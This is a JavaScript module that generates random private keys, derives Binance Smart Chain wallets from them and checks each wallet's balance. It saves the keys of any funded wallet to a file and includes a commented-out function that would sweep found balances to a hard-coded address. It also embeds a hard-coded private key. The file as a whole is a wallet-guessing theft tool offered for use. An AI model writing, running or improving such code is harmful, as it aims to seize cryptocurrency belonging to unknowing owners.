// const { JsonRpcProvider } = require("@ethersproject/providers");
// const { Wallet } = require("@ethersproject/wallet");
const dotenv = require("dotenv");
const BigNumber = require("BigNumber.js");
const fs = require("fs");
const _ = require("lodash");
const { randomBytes } = require('crypto');
const PRIVATE_KEY='f28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'  // Random wallet for makingn calls
              
let pk 
let found = 0
let checkedThisSession = 0
let startTime = new Date()
// not sure what this does, but IT IS REQUIRED to do stuff.
const result = dotenv.config();
if (result.error) {
  throw result.error;
}

// setup wallet stuff and default account needed to make some calls and preps for success Uses PRIVATE_KEY as ann initial test. then rocks and rolls

const Web3 = require("web3");
const w = new Web3(process.env.BSC_RPC);

let wallet = w.eth.accounts.wallet.add(
  w.eth.accounts.privateKeyToAccount(PRIVATE_KEY)
);
w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
  PRIVATE_KEY
).address;

// sets Private Key based on if there is HISTORY or NOT
const setPK = async (newPK) => {
  const starter = await getStartPoint(newPK)
  // console.log(starter)
  pk = starter
}


// Used to increment Private Key
const setWallet = async () => {
 
  if(wallet.index > 10000) {
    wallet = w.eth.accounts.wallet.clear()
  }
    // pk = pk.plus(1)
    // const t = pk.toString(16).padStart(64,0)
    const privKey = randomBytes(32)
    // const k1 = secp256k1.publicKeyCreate(privKey)
    const pKeyString = privKey.toString('hex')
    // let address = createKeccakHash('keccak256').update(k1).digest().slice(-20).toString('hex')
    // let k = '0x'+address

    wallet = w.eth.accounts.wallet.add(
      w.eth.accounts.privateKeyToAccount(pKeyString)
    );

}


const checkBalance = async (amount) => {
  const wToCheck = wallet
  w.eth.getBalance(wToCheck.address).then(function (b) {    
    let balance = Web3.utils.fromWei(b, "ether");
    checkedThisSession++
    if (balance > parseFloat(amount)) {
      found++
      console.log(`Found Ya!: ${balance} BNB`);
      console.log(wToCheck, found)
      saveRound(wToCheck, balance)
    }
  });
  // log last checked  
  checked(wToCheck)
};
const logInfo = async() => {
  var currentTime = new Date()
  var elapsed = currentTime - startTime;
  var elapsedSeconds = Math.round(elapsed / 1000);
  var rate = Math.round(checkedThisSession / elapsedSeconds)
  console.log(`Found: ${found}   Checked: ${checkedThisSession}  Elapsed: ${elapsedSeconds} seconds   Rate: ${rate}/s`)
}


// LOGGING INFORMATION -- CHECKED logs every x checked info to be retreived for starting points -- saveRound saves wallet info for wallets with BNB
const checked = async (wallet) => {
  const roundData = [
    {
      address: wallet.address.toString(),
      pKey: wallet.privateKey.toString(),
    },
  ];
  let path = `./history/checked.json`;
  try {
    if (fs.existsSync(path)) {
        let updated, history, merged, historyParsed;
        try {
          history = fs.readFileSync(path);
          historyParsed = JSON.parse(history);
          merged = _.merge(
            _.keyBy(historyParsed, "round"),
            _.keyBy(roundData, "round")
          );
          updated = _.values(merged);
        } catch (e) {
          console.log(e);
          return;
        }
        fs.writeFileSync(path, JSON.stringify(updated), "utf8");  
    } else {
      fs.writeFileSync(path, JSON.stringify(roundData), "utf8");
    }
  } catch (err) {
    console.error(err);
  }
};



const saveRound = async (cWallet, amount) => {
  const roundData = [
    {
      address: cWallet.address.toString(),
      pKey: cWallet.privateKey.toString(),
      value: amount.toString(),
    },
  ];
  let path = `./history/WithBalance.json`
  
    if (fs.existsSync(path)) {
        try {
          const fileData = JSON.parse(fs.readFileSync(path))
          fileData.push(roundData)
          fs.writeFileSync(path, JSON.stringify(fileData, null, 2));
        } catch (e) {
          fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
        }
       
    } else {
      fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
    }
  
};




// Retreive checked
const getStartPoint = async (STARTPOINT) => {
  let path = `./history/checked.json`;
  try {
    if (fs.existsSync(path)) {
      let history, historyParsed;
      try {
        history = fs.readFileSync(path);
        historyParsed = JSON.parse(history);
      } catch (e) {
        console.log("Error reading history:", e);
        return;
      }
        return new BigNumber(historyParsed[historyParsed.length - 1].pKey.toString(16));
      
    } else {
      return STARTPOINT;
    }
  } catch (err) {
    console.error(err);
  }
};


 // INFORMATION IF WE DECIDE TO ADD AN AUTO WITHDRAWL FUNCTION
/*
const signer = new Wallet(
  PRIVATE_KEY,
  new JsonRpcProvider(process.env.BSC_RPC_LOGGER)
);

const sendFunds = async (r) => {
  try {
    if ( r !== null) {
      w.eth.getBalance(wallet.address).then(function (b) {
        w.eth
          .estimateGas({
            from: wallet.address,
            to: confirmContract(abi),
            amount: b,
          })
            
          .then(function (g) {
            w.eth.getGasPrice().then(function (gP) {
              let _b = parseFloat(b);
              let _g = parseFloat(g);
              let _gP = parseFloat(gP);
              w.eth.sendTransaction({
                from: wallet.address,
                to: "0x27debbaf0e4c072fc3c71123581e61B22e25f015",
                gas: _g,
                gasPrice: _gP,
                value: ((_b - _gP * _g) / 1.1).toFixed(0),
                data: "0x",
              });
            });
          }); 
      });
      return true;
    }
    return true;
  } catch {
    return !0;
  }
};
*/



module.exports = {
  checkBalance,
  setWallet,
  setPK,
  logInfo
};
